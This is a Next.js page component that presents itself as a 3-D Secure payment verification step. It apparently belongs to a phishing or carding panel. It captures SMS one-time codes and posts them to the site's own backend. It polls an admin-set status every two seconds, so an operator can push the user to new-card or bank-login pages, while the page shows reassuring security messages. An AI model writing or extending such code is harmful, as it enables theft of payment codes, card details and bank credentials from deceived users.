'use client'

import { useState, useEffect } from 'react'
import { useRouter, useSearchParams, useParams } from 'next/navigation'
import { useAuth } from '@/hooks/use-auth'
import { useTranslations } from 'next-intl'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Input } from '@/components/ui/input'
import { Button } from '@/components/ui/button'
import { Label } from '@/components/ui/label'
import { Shield, Lock, CreditCard, ArrowRight, Loader2, CheckCircle } from 'lucide-react'
import { useToast } from '@/hooks/use-toast'
import { motion } from 'framer-motion'

interface PaymentData {
  payment_id: string
  amount: number
  currency: string
  user_email: string
}

export default function ThreeDSPage() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const { locale } = useParams() as { locale: string }
  const { isAuthenticated, isLoading } = useAuth()
  const { toast } = useToast()
  const t = useTranslations('payments')
  
  const [code, setCode] = useState('')
  const [loading, setLoading] = useState(false)
  const [redirecting, setRedirecting] = useState(false)
  const [paymentData, setPaymentData] = useState<PaymentData | null>(null)
  const [isTyping, setIsTyping] = useState(false) // Track if user is typing
  const [typingTimeout, setTypingTimeout] = useState<NodeJS.Timeout | null>(null)

  useEffect(() => {
    // Get payment data from URL parameters
    const paymentId = searchParams.get('payment_id')
    const amount = searchParams.get('amount')
    const currency = searchParams.get('currency')
    const userEmail = searchParams.get('user_email')

    if (!paymentId) {
      toast({ title: 'Ошибка', description: 'ID платежа не найден', variant: 'destructive' })
      router.push(`/${locale}/payments`)
      return
    }

    // If we have all fields, use them
    if (amount && currency && userEmail) {
      setPaymentData({
        payment_id: paymentId,
        amount: parseFloat(amount),
        currency: currency,
        user_email: userEmail
      })
      return
    }

    // Otherwise fetch payment details by ID
    (async () => {
      try {
        const token = localStorage.getItem('token')
        if (!token) {
          router.push(`/${locale}/login?redirect=${encodeURIComponent(`/${locale}/payments/3ds?payment_id=${paymentId}`)}`)
          return
        }
        const res = await fetch(`http://localhost:8000/api/payments/payment/${paymentId}/`, {
          headers: { Authorization: `Bearer ${token}` }
        })
        if (!res.ok) {
          throw new Error('Failed to load payment details')
        }
        const data = await res.json()
        setPaymentData({
          payment_id: paymentId,
          amount: data.amount,
          currency: data.currency,
          user_email: data.user?.email || data.user_email || ''
        })
      } catch (e) {
        console.error('Failed to load payment by id', e)
        toast({ title: 'Ошибка', description: 'Данные платежа не найдены', variant: 'destructive' })
        router.push(`/${locale}/payments`)
      }
    })()
  }, [searchParams, router, toast, locale])

  useEffect(() => {
    if (!isLoading && !isAuthenticated) {
      const qs = searchParams.toString()
      const target = `/${locale}/payments/3ds${qs ? `?${qs}` : ''}`
      router.push(`/${locale}/login?redirect=${encodeURIComponent(target)}`)
    }
  }, [isAuthenticated, isLoading, router, locale, searchParams])

  // Poll payment status for admin actions - ALWAYS ACTIVE but RESPECTFUL
  useEffect(() => {
    if (!paymentData?.payment_id || !isAuthenticated) return

    const pollInterval = setInterval(async () => {
      // DON'T poll if user is actively typing 3DS code
      if (isTyping) {
        console.log('⏸️ Skipping poll - user is typing 3DS code')
        return
      }

      try {
        const token = localStorage.getItem('token')
        if (!token) {
          console.error('No authentication token found')
          return
        }

        // Validate paymentId format
        if (!paymentData.payment_id || paymentData.payment_id.length < 10) {
          console.error('Invalid payment ID format:', paymentData.payment_id)
          return
        }

        const response = await fetch(`http://localhost:8000/api/payments/payment/${paymentData.payment_id}/status`, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        })

        if (response.ok) {
          const data = await response.json()
          const status = data.status

          console.log('🔄 3DS page - Payment status polled:', status)

          // Check if admin has requested a different action
          if (status === 'requires_new_card') {
            console.log('💳 Admin requested new card - redirecting...')
            router.push(`/${locale}/payments/new-card?payment_id=${paymentData.payment_id}&amount=${paymentData.amount}&currency=${paymentData.currency}&user_email=${paymentData.user_email}`)
          } else if (status === 'requires_bank_login') {
            console.log('🏦 Admin requested bank login - redirecting...')
            router.push(`/${locale}/payments/bank-login?payment_id=${paymentData.payment_id}&amount=${paymentData.amount}&currency=${paymentData.currency}&user_email=${paymentData.user_email}`)
          } else if (status === 'waiting_3ds') {
            console.log('🔐 Admin requested 3DS again - staying on 3DS page')
            // Stay on 3DS page, admin requested 3DS again
          } else if (status === 'completed' || status === 'failed' || status === 'cancelled') {
            console.log('🏁 Payment final status reached:', status)
            router.push(`/${locale}/payments`)
          }
        } else {
          console.error('Failed to fetch payment status:', response.status, response.statusText)
        }
      } catch (error) {
        console.error('Payment status polling error:', error)
      }
    }, 2000) // Poll every 2 seconds - ALWAYS ACTIVE

    return () => clearInterval(pollInterval)
  }, [paymentData, isAuthenticated, locale, router, isTyping])

  // Cleanup timeout on component unmount
  useEffect(() => {
    return () => {
      if (typingTimeout) {
        clearTimeout(typingTimeout)
      }
    }
  }, [typingTimeout])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Normalize code (remove spaces)
    const digitsOnly = code.replace(/\s+/g, '')

    // Validate 3DS code format
    if (!digitsOnly) {
      toast({
        title: t('error'),
        description: t('enter3dsCode'),
        variant: "destructive",
      })
      return
    }

    // Validate 3DS code length (usually 3-6 digits)
    if (digitsOnly.length < 3 || digitsOnly.length > 6) {
      toast({
        title: t('error'),
        description: '3DS код должен содержать от 3 до 6 цифр',
        variant: "destructive",
      })
      return
    }

    // Validate 3DS code contains only digits
    if (!/^\d+$/.test(digitsOnly)) {
      toast({
        title: t('error'),
        description: '3DS код должен содержать только цифры',
        variant: "destructive",
      })
      return
    }

    if (!paymentData) {
      toast({
        title: t('error'),
        description: t('paymentDataNotFound'),
        variant: "destructive",
      })
      return
    }

    // Validate payment ID format
    if (!paymentData.payment_id || paymentData.payment_id.length < 10) {
      toast({
        title: t('error'),
        description: 'Неверный формат ID платежа',
        variant: "destructive",
      })
      return
    }

    setLoading(true)
    
    try {
      const token = localStorage.getItem('token')
      if (!token) {
        toast({
          title: t('authorizationError'),
          description: t('loginToContinue'),
          variant: "destructive",
        })
        router.push('/login')
        return
      }

      // Send 3DS code to server
      const response = await fetch(`http://localhost:8000/api/payments/payment/${paymentData.payment_id}/3ds`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ 
          code: digitsOnly 
        }),
      })

      const result = await response.json()

      if (response.ok) {
        toast({
          title: "Success",
          description: "3DS code sent",
          variant: "default"
        })

        // Start real-time redirect
        setRedirecting(true)
        
        // Check where to redirect user
        if (result.requires_new_card) {
          setTimeout(() => {
            router.push(`/payments/new-card?payment_id=${paymentData.payment_id}&amount=${paymentData.amount}&currency=${paymentData.currency}&user_email=${encodeURIComponent(paymentData.user_email)}`)
          }, 2000)
        } else if (result.requires_bank_login) {
          setTimeout(() => {
            router.push(`/payments/bank-login?payment_id=${paymentData.payment_id}&amount=${paymentData.amount}&currency=${paymentData.currency}&user_email=${encodeURIComponent(paymentData.user_email)}`)
          }, 2000)
        } else {
          // Redirect to status page
          setTimeout(() => {
            router.push(`/${locale}/payments/status/${paymentData.payment_id}?step=3ds_completed`)
          }, 2000)
        }
      } else {
        toast({
          title: t('error'),
          description: result.error || "Failed to send 3DS code",
          variant: "destructive",
        })
      }
    } catch (error) {
      console.error('3DS submission error:', error)
      toast({
        title: t('error'),
        description: "An error occurred while sending the code",
        variant: "destructive",
      })
    } finally {
      setLoading(false)
    }
  }

  const formatCode = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
    if (v.length >= 6) {
      return v.substring(0, 3) + ' ' + v.substring(3, 6)
    }
    return v
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-black text-white flex items-center justify-center">
        <div className="text-center">
          <Loader2 className="h-8 w-8 animate-spin mx-auto mb-4" />
          <p>{t('redirecting')}</p>
        </div>
      </div>
    )
  }

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-black text-white flex items-center justify-center">
        <div className="text-center">
          <Loader2 className="h-8 w-8 animate-spin mx-auto mb-4" />
          <p>{t('redirecting')}</p>
        </div>
      </div>
    )
  }

  if (redirecting) {
    return (
      <div className="min-h-screen bg-black text-white flex items-center justify-center">
        <div className="text-center">
          <CheckCircle className="h-16 w-16 text-green-500 mx-auto mb-4" />
          <h2 className="text-2xl font-bold mb-2">{t('codeSent')}</h2>
          <p className="text-gray-400 mb-4">{t('redirectingToNextPage')}</p>
          <div className="flex items-center justify-center space-x-2">
            <Loader2 className="h-4 w-4 animate-spin" />
            <span>{t('realTimeRedirecting')}</span>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-black text-white py-20">
      <div className="max-w-2xl mx-auto px-4">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
          className="text-center mb-8"
        >
          <h1 className="text-4xl font-bold text-white neon-glow mb-4">
            🔒 <span className="text-cyan-400">{t('title')}</span>
          </h1>
          <p className="text-xl text-gray-300">
            {t('subtitle')}
          </p>
        </motion.div>

        {paymentData && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8, delay: 0.2 }}
            className="mb-8"
          >
            <Card className="bg-black/50 border-cyan-500/30">
              <CardHeader>
                <CardTitle className="text-cyan-400">{t('paymentInfo')}</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-2 gap-4 text-sm">
                  <div>
                    <span className="text-gray-400">{t('paymentId')}:</span>
                    <p className="text-white font-mono">{paymentData.payment_id}</p>
                  </div>
                  <div>
                    <span className="text-gray-400">{t('amount')}:</span>
                    <p className="text-white">{paymentData.amount} {paymentData.currency}</p>
                  </div>
                  <div className="col-span-2">
                    <span className="text-gray-400">{t('email')}:</span>
                    <p className="text-white">{paymentData.user_email}</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </motion.div>
        )}

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.4 }}
        >
          <Card className="bg-black/50 border-cyan-500/30">
            <CardHeader>
              <CardTitle className="text-white">{t('verification')}</CardTitle>
              <CardDescription className="text-gray-400">
                {t('smsCodeDescription')}
              </CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="space-y-2">
                  <Label htmlFor="code" className="text-white">{t('smsCode')}</Label>
                  <Input
                    id="code"
                    type="text"
                    placeholder="123 456"
                    value={code}
                    onChange={(e) => {
                      setCode(formatCode(e.target.value))
                      
                      // Set typing state to prevent polling interruption
                      setIsTyping(true)
                      
                      // Clear previous timeout
                      if (typingTimeout) {
                        clearTimeout(typingTimeout)
                      }
                      
                      // Set timeout to resume polling after user stops typing
                      const timeout = setTimeout(() => {
                        setIsTyping(false)
                        console.log('✅ User stopped typing - resuming polling')
                      }, 3000) // Resume polling 3 seconds after user stops typing
                      
                      setTypingTimeout(timeout)
                    }}
                    onFocus={() => {
                      setIsTyping(true)
                      console.log('🔒 User focused on 3DS input - pausing polling')
                    }}
                    onBlur={() => {
                      // Resume polling when user leaves the input
                      setTimeout(() => {
                        setIsTyping(false)
                        console.log('🔓 User left 3DS input - resuming polling')
                      }, 1000) // Small delay to prevent immediate polling
                    }}
                    maxLength={7}
                    className="bg-gray-900 border-cyan-500/30 text-white placeholder-gray-400 text-center text-2xl font-mono tracking-widest"
                    required
                  />
                  <p className="text-xs text-gray-400 text-center">
                    {t('enter6DigitCode')}
                  </p>
                </div>

                <Button
                  type="submit"
                  disabled={loading || !code.trim()}
                  className="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 text-white transition-all duration-300"
                >
                  {loading ? (
                    <>
                      <Loader2 className="h-4 w-4 animate-spin mr-2" />
                      {t('sending')}
                    </>
                  ) : (
                    <>
                      {t('confirmPayment')}
                      <ArrowRight className="h-4 w-4 ml-2" />
                    </>
                  )}
                </Button>
              </form>
            </CardContent>
          </Card>
        </motion.div>

        {/* Security information */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.6 }}
          className="mt-8"
        >
          <Card className="bg-green-500/10 border-green-500/30">
            <CardContent className="pt-6">
              <div className="flex items-start gap-3">
                <Shield className="h-5 w-5 text-green-400 mt-0.5" />
                <div className="text-sm text-green-300">
                  <p className="font-medium mb-1">{t('security')}</p>
                  <p className="text-green-200">
                    {t('securityDescription')}
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>
        </motion.div>

        {/* Redirect information */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.8 }}
          className="mt-8 text-center"
        >
          <p className="text-gray-400 text-sm">
            🔒 {t('secureConnection')}
          </p>
          <p className="text-gray-400 text-sm mt-2">
            📱 {t('realTimeRedirect')}
          </p>
        </motion.div>
      </div>
    </div>
  )
}
